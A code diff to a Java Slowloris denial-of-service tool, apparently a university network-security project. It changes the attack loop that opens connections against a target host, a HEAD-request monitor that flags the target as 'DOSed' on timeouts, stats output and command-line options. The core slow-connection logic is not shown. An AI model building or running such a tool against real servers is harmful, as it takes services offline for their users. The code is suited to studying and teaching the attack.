@@ -2,7 +2,6 @@ package in.ac.iiitd.ns;
 
 import java.io.IOException;
 import java.net.HttpURLConnection;
-import java.net.Socket;
 import java.net.SocketTimeoutException;
 import java.net.URL;
 import java.util.ArrayList;
@@ -12,7 +11,7 @@ import java.util.concurrent.Executors;
 
 public class SlowLoris {
 
-    public static final boolean DEBUG = true;
+    public static final boolean DEBUG = false;
 
     // Global Parameters for statistics;
     private int pending;
@@ -28,6 +27,7 @@ public class SlowLoris {
     private final int time;
     private final int rate;
     private final int timeout;
+    public static String outDir;
 
     public static ArrayList<Stats> stats;
 
@@ -63,10 +63,11 @@ public class SlowLoris {
         public void run() {
             // TODO Auto-generated method stub
             for(int i = 0; ; i++){
-                stats.add(new Stats(i, closed, pending, connected, isAvailable?connections:0));
-                if(DEBUG){
-                    System.out.println(stats.get(i).toString());
+                Stats S = new Stats(i, closed, pending, connected, isAvailable?connections:0);
+                if(i%5 == 0){
+                    Stats.printConsoleStats(S);
                 }
+                stats.add(S);
                 try {
                     Thread.sleep(995);
                 } catch (InterruptedException e) {
@@ -82,32 +83,21 @@ public class SlowLoris {
         @Override
         public void run() {
             // TODO Auto-generated method stub
-            Socket socket = null;
             HttpURLConnection connection = null;
             while(true){
                 try {
-                    /*
-                    socket = new Socket(InetAddress.getByName(hostname), 80);
-                    socket.setSoTimeout(timeout);
-                    socket.getInputStream().read();
-                    // */
                     connection = (HttpURLConnection) new URL(hostname.startsWith("http://")?hostname:"http://" + hostname).openConnection();
                     connection.setConnectTimeout(timeout);
                     connection.setReadTimeout(timeout);
                     connection.setRequestMethod("HEAD");
-                    connection.getResponseCode();
+                    int response = connection.getResponseCode();
+                    if(DEBUG)
+                        System.out.println(response);
                     clearDOSed();
                 } catch (SocketTimeoutException e) {
                     setDOSed();
                 } catch(IOException e){
                     e.printStackTrace();
-                }
-
-                if(socket != null){
-                    try {
-                        socket.close();
-                    } catch (IOException e) {
-                    }
                 }
 
                 try {
@@ -125,10 +115,12 @@ public class SlowLoris {
 
         switch(type){
             case CONNECTED: 
+                //if(pending == 0) return;
                 pending--;
                 connected++;
                 break;
             case CLOSED:
+                //if(closed == connections) return;
                 connected--;
                 closed++;
                 break;
@@ -163,6 +155,7 @@ public class SlowLoris {
         this.time = getCLAInt("-t") * 1000;
         this.rate = getCLAInt("-r");
         this.timeout = getCLAInt("-o");
+        outDir = CLA.get("-d").endsWith("/")?CLA.get("-d"):CLA.get("-d") + "/";
 
         pending = connections;
         connected = 0;
@@ -178,7 +171,7 @@ public class SlowLoris {
         System.out.println("Attack Started for Duration : " + time/1000 + "s");
         long sTime = System.currentTimeMillis() - 500;
         int i = 0;
-
+        int conn = connections;
         // To perform Http PING repeatedly 
         new Thread(ping).start();
 
@@ -186,12 +179,12 @@ public class SlowLoris {
         new Thread(UPDATE_STATS).start();
 
         while(System.currentTimeMillis() - sTime < time){
-            for(int r = 0; r < rate && pending > 0 && isAvailable; r++) {
+            for(int r = 0; r < rate && conn > 0; r++, conn--) {
                 exec.execute(new Connection(hostname, port, interval, this, i += 3));
             }
 
             try {
-                Thread.sleep(500);
+                Thread.sleep(1000);
             } catch (InterruptedException e) {
                 // TODO Auto-generated catch block
                 e.printStackTrace();
@@ -213,7 +206,12 @@ public class SlowLoris {
      */
     private static void processInput(String[] args) {
         // TODO Auto-generated method stub
-        if(args.length % 2 != 0){
+        
+        if(args.length == 1 && args[0].equals("--h")){
+            System.out.println(USEAGE);
+            System.exit(0);
+        }
+        else if(args.length % 2 != 0){
             System.out.println(USEAGE);
             System.exit(0);
         } 
